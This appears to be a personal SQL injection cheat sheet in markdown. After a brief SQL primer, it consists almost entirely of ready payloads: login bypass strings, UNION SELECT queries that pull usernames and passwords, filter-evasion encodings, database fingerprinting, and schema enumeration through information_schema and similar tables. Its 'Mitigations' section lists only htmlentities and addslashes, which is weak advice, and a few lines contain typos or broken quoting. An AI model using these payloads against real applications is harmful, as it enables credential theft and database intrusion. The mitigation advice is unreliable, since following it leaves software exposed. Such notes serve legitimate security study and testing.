---
title:  "SQL injections"
topic: "web"
---
# SQL memo
## Data types
* **INT**: signed integer on 4 bytes
* **DATE** and **TIME**: self-explanatory. Moron.
* **VARCHAR**: strings
* **BLOB** and **TEXT**: binary object of big size
* **ENUM** and **SET**: string in a list

## Commands
{% highlight sql %}
SHOW databases;
CREATE database database_name;
USE database_name;
CREATE TABLE users (id INT NOT NULL, login VARCHAR(20), password VARCHAR(40));
DESC users; # Display the structure of the table
INSERT INTO table_name VALUES(123, 'test_user', 'test_pass'); # Clear-text password
INSERT INTO table_name VALUES(1234, 'sec_user', password('test_pass'));
ALTER TABLE users MODIFY password VARCHAR(41);
UPDATE users SET password=password('better_pass_123') WHERE login='test_user';
SELECT * FROM users WHERE login='test_user' AND password=password(better_pass_123');
DROP TABLE users;
{% endhighlight %}



# Simple injections
* `'`, `''` (SQL-escaped single quote)
* `test' OR 1=1 --`
* `UNION SELECT login, password FROM users #`
* Select the line using **LIMIT**: `UNION SELECT login, password FROM users LIMIT 1,1 #`
* Balancing the quotes: `test' OR 'a' ='a`
* Wildxard character: `%``
* Numerics: `3-1`, `67-ASCII('A')`, `51-ASCII(1)` (implicit numeric to string cast)
* Test if injection in **SELECT**: input `1` results in `SELECT 1,..` so first column is filled with 1s
* Return number of lines: `aa' UNION SELECT count(*), users.password FROM users; --`
* `' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 1; --`


# Mitigations
* PHP `htmlentities()`
* PHP `addslashes()`. Can be bypassed if another encoding is used.



# Strategies
* Get the version string of the database
* Use string concatenation techniques to produce legitimate input
* MySQL ~ Sybase
* Blind injection: insert data into a user field, such as a profile name
* Blind injection: best to look for interesting columns names rather than tables (use `LIKE '%pass%'` for password-related columns)
* Second order injections



# Tactics
* URL-encode HTTP-related characters
* Oracle globally accessible table: `DUAL`. Useful to complete **SELECT** statements
* Return strings through numeric columns: `ASCII` and `SUBSTRING` functions to return one character at a time

## SELECT filtering bypasses
```
SeLeCt
%00SELECT
SESELECTLECT
%53%45%4C%45%43%54
%2553%2545%254C%2545%2543%2554
SE/*MySQL only*/LECT
```

## Comments as spaces
* `SELECT/*foo*/password/*bar*/FROM/*foobar*/users`
* MySQL: comments inside keywords `SE/*damn!*/LECT/*foo*/password/*bar*/FROM/*foobar*/users`

## Database fingerprinting
* Oracle: `BITAND(1,1)-BITAND(1,1)`
* MS-SQL: `@@PACKED_RECEIVED-@@PACKED_RECEIVED`
* MySQL: `CONNECTION_ID()-CONNECTION_ID()`
* MySQL version fingerprinting: inline comment `/*!32302 and 1=0*/` ignored if database version doesn't match `32302` version string. Else, interpreted as `and 1=0`
* Comments:
  * MS-SQL, MySQL (with a space after double hyphens), Oracle: `--`
  * `#`
  * `;`
* MS-SQL and MySQL version string: `' UNION SELECT @@version, NULL-- `
* Oracle version string: `' UNION SELECT banner, NULL, NULL FROM v$version--`


## String
* Concatenation useful to return multiple results when only one **VARCHAR** columns found
* Oracle concatenation: `'||'test`
* MS-SQL concatenation: `'+'test`
* MySQL concatenation: `' 'test` (mind the space)
* Build Oracle string: `CHR(97)||CHR(98)='ab'`
* Build MS-SQL string: `CHAR(97)+CHAR(98)='ab'`


## Blind injections
* Table structure with MS-SQL, MySQL, SQLite and Postgresql: `' UNION SELECT table_name,column_name FROM information_schema.columns--`
* Table structure with MS-SQL: `SELECT table_name+':'+column_name FROM information_schema.columns--`
* Table structure with MySQL: `SELECT CONCAT(table_name, ':', column_name) FROM information_schema.columns--`
* Table structure with SQLite: `' UNION SELECT name, sql FROM sqlite_master;`
* Table structure with Oracle:
  * `' UNION SELECT table_name,column_name FROM all_tab_columns;`
  * `' UNION SELECT table_name,column_name FROM user_tab_columns;`
  * `SELECT table_name||':'||column_name FROM all_tab_columns;`
* Number of columns:
  * `ORDER BY 1`, `ORDER BY 2` ...
  * `UNION SELECT NULL--`, `UNION SELECT NULL, NULL--` ... Should be checked by reviewing raw response. Add `FROM DUAL` if Oracle.
* Discovering string columns: `SELECT 'a', NULL, NULL`, `SELECT NULL, 'a', NULL`, `SELECT NULL, NULL, 'a'`
* Name of columns: `ORDER BY "column_name"`
* Length of a string: TODO
* Number of values for **INSERT** statements: iteratively add fields
  ```
  test')--
  test', 1)-- Implicitly casted to a string in most DBMS
  test', 1, 2000)--  Implicitly casted to a date in most DBMS
  ...
  ```
* **SELECT** statement with unknown column type: `SELECT NULL, password`
